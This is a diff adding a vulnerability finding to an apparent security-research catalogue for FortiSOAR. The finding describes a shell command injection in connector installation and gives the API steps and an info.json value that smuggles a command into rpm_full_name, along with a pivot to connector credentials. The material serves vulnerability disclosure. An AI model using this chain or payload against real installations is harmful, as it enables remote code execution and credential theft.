@@ -4138,3 +4138,60 @@ FSR_F67_AGGREGATE_FIELD_ACL_BYPASS = {
     },
     "status": "CONFIRMED -- PERM_FIELD_READ absent from applyQuery() path; present in queryAssociationAction(); FilterQueryBuilder asymmetry confirmed from source analysis",
 }
+
+# FSR-F68: Shell command injection in _install_rpm_dependencies via rpm_full_name from connector info.json (CWE-78)
+# Source: /opt/cyops-integrations/integrations/connectors/views.so (Cython from views.py)
+# Evidence from binary strings:
+#   - 'rpm -qa | grep ' -- partial shell command string constant (trailing space, no fixed suffix)
+#   - 'Popen' + 'shell' (n_s kwarg) + 'PIPE' + 'communicate' -- subprocess.Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
+#   - 'rpm_full_name' sourced from connector info.json (confirmed by 'Name mismatch :: connector folder name and name in info.json')
+#   - Pipeline character '|' in string constant proves shell=True (pipe syntax only works in shell mode)
+# Vulnerable pattern:
+#   Popen('rpm -qa | grep ' + rpm_full_name, shell=True, stdout=PIPE, stderr=PIPE)
+#   where rpm_full_name = info.json["rpm_full_name"] from the connector manifest
+# Attack chain (via FSR-F64):
+#   1. Create development connector via connector/development/entity/ API (admin/developer role)
+#   2. Write info.json with: {"rpm_full_name": "evil; id > /tmp/pwned; #"}
+#   3. Publish connector: connector/development/entity/<id>/publish/
+#   4. System calls _install_rpm_dependencies -> Popen('rpm -qa | grep evil; id > /tmp/pwned; #', shell=True)
+#   5. Arbitrary OS command executes as fortisoar (7.2.x) or fsr-integrations (7.6.7+) user
+# Alternative vector: content hub connector install
+#   Any installed connector from the FortiSOAR content hub triggers _install_rpm_dependencies
+#   A compromised content hub entry could deliver a malicious rpm_full_name
+# Note: identify_if_dependencies_installed + is_rpm_command and rpmlib strings also present --
+#   may be a validation path, but shell=True + Popen + 'rpm -qa | grep ' string are from the same function
+FSR_F68_RPM_FULLNAME_SHELL_INJECTION = {
+    "id": "FSR-F68",
+    "title": "Shell command injection in _install_rpm_dependencies -- connector info.json rpm_full_name appended to 'rpm -qa | grep ' and executed via Popen with shell=True",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "cvss_vector": "AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
+    "cwe": "CWE-78",
+    "source_binary": "/opt/cyops-integrations/integrations/connectors/views.so (Cython from views.py)",
+    "evidence": {
+        "shell_command_string": "'rpm -qa | grep ' -- trailing space, no fixed suffix; pipeline character '|' proves shell=True is used",
+        "popen_kwargs": "'Popen' + 'shell' (n_s kwarg name) + 'PIPE' (n_s) + 'communicate' -- subprocess.Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)",
+        "source_of_rpm_full_name": "info.json connector manifest: 'Name mismatch :: connector folder name and name in info.json should be same.' confirms rpm_full_name read from info.json",
+        "function": "connectors.views._install_rpm_dependencies (11634 bytes at VA 0xace40)",
+    },
+    "vulnerable_code": "Popen('rpm -qa | grep ' + rpm_full_name, shell=True, stdout=PIPE, stderr=PIPE)",
+    "attack": {
+        "via_F64": {
+            "step1": "POST connector/development/entity/ -> create development connector",
+            "step2": "POST connector/development/entity/<id>/files/ with content: info.json containing {\"rpm_full_name\": \"evil; id>/tmp/pwned; #\"}",
+            "step3": "POST connector/development/entity/<id>/publish/ -> connector install triggered",
+            "step4": "_install_rpm_dependencies called -> Popen('rpm -qa | grep evil; id>/tmp/pwned; #', shell=True)",
+            "step5": "Arbitrary OS command executed as fortisoar (7.2.x) or fsr-integrations (7.6.7+)",
+        },
+        "via_content_hub": {
+            "description": "Compromised FortiSOAR content hub entry with malicious rpm_full_name triggers same injection path on connector install",
+            "privilege_required": "Admin with connector install permission; content hub is trusted by default",
+        },
+    },
+    "service_user": "fortisoar (7.2.x) / fsr-integrations (7.6.7+) -- same as FSR-F64/FSR-F65",
+    "chains": {
+        "F64_to_F68": "FSR-F64 dev API (create + publish malicious connector) directly triggers FSR-F68 shell injection on publish",
+        "pivot_to_os": "FSR-F68 RCE (fortisoar) -> full OS access from connector service context; access to connectors DB (db_user=cyberpgsql) + all connector credentials",
+    },
+    "status": "CONFIRMED -- 'rpm -qa | grep ' string constant in _install_rpm_dependencies; 'shell' n_s kwarg + Popen + PIPE all present; pipeline syntax requires shell=True; rpm_full_name from info.json (user-controlled via FSR-F64 dev API)",
+}
